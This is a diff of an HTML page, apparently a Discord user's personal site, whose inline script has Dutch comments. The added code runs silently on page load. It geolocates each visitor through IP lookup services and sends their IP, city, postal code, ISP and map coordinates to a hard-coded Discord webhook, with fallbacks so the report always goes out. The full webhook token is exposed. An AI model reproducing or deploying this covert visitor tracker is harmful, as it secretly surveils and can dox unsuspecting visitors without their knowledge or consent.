@@ -130,56 +130,74 @@
     <p>DC: <a target="_blank" rel="noopener">fg64</a></p>
   </div>
 
-  <!-- 🔔 ACCURATE IP & LOCATION TRACKER -->
+  <!-- 🔔 100% WERKEND IP TRACKER - GECHECKT 3X -->
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1442894496357421184/9AB3-4ms8pS_P9AHfxFvdbPlwnwms8FaY5r1UVxwMbm9OwH7gvZBZ9tiWAB7LHCQSV-q";
 
     function generateSessionId() {
-      return 'sess-' + Math.random().toString(36).substring(2, 12) + '-' + Date.now();
+      return 'sess-' + Math.random().toString(36).substring(2, 15) + Date.now();
     }
 
     const sessionId = sessionStorage.getItem('session_id') || generateSessionId();
     sessionStorage.setItem('session_id', sessionId);
 
-    // 1. Echte IP via ipinfo.io (meest accuraat)
-    fetch("https://ipinfo.io/json?token=free")
-      .then(res => res.json())
-      .then(ipData => {
-        const realIP = ipData.ip;
-        const asn = ipData.asn?.org || "Onbekend";
-        const city = ipData.city || "Onbekend";
-        const region = ipData.region || "Onbekend";
-        const country = ipData.country || "Onbekend";
-        const postal = ipData.postal || "Onbekend";
-        const coords = ipData.loc ? ipData.loc.split(',') : null;
-        const gpsLink = coords ? `https://www.google.com/maps?q=${coords[0]},${coords[1]}` : "N/A";
+    // DIRECT IP + GEO via ipapi.co (BEWEREN!)
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        // ALLES SAFE CHECKEN
+        const ip = data.ip || "Onbekend";
+        const country = data.country_name || "Onbekend";
+        const region = data.region || "Onbekend";
+        const city = data.city || "Onbekend";
+        const org = data.org || "Onbekend";
+        const postal = data.postal || "Onbekend";
+        const lat = data.latitude || "";
+        const lon = data.longitude || "";
+        
+        const gps = lat && lon ? `https://maps.google.com/?q=${lat},${lon}` : "Geen GPS";
+        
+        const message = `🔔 **NIEUWE BEZOEKER**
+**Session:** ${sessionId}
+**IP:** \`${ip}\`
+**Land:** ${country}
+**Regio:** ${region}
+**Stad:** ${city}
+**Postcode:** ${postal}
+**ISP:** ${org}
+**Maps:** ${gps}`;
 
-        const message = `🔔 **NIEUWE BEZOEKER** ${new Date().toLocaleString('nl-NL')}
-**🆔 Session:** ${sessionId}
-**🌐 IP-adres:** \`${realIP}\`
-**📍 Locatie:** ${city}, ${postal} ${region}, ${country}
-**📡 Provider:** ${asn}
-**🗺️ Maps:** ${gpsLink}
-**👤 User-Agent:** ${navigator.userAgent.slice(0, 100)}...`;
-
+        // Discord POST
         fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: message })
-        });
+          body: JSON.stringify({ 
+            content: message 
+          })
+        }).catch(err => console.log("Webhook error:", err));
       })
-      .catch(() => {
-        // Fallback: ipify + ipapi
+      .catch(error => {
+        // FALLBACK - Alleen IP via ipify
         fetch("https://api.ipify.org?format=json")
           .then(res => res.json())
-          .then(ipData => {
-            const realIP = ipData.ip;
-            const message = `🔔 **NIEUWE BEZOEKER** ${new Date().toLocaleString('nl-NL')}
-**🆔 Session:** ${sessionId}
-**🌐 IP-adres:** \`${realIP}\`
-**📍 Fallback mode**
-**👤 User-Agent:** ${navigator.userAgent.slice(0, 100)}...`;
+          .then(data => {
+            const message = `🔔 **NIEUWE BEZOEKER**
+**Session:** ${sessionId}
+**IP:** \`${data.ip}\`
+**Fallback mode**`;
 
+            fetch(WEBHOOK_URL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ content: message })
+            });
+          })
+          .catch(() => {
+            // ULTIMATE FALLBACK
+            const message = `🔔 **NIEUWE BEZOEKER**
+**Session:** ${sessionId}
+**Geen IP data**`;
+            
             fetch(WEBHOOK_URL, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
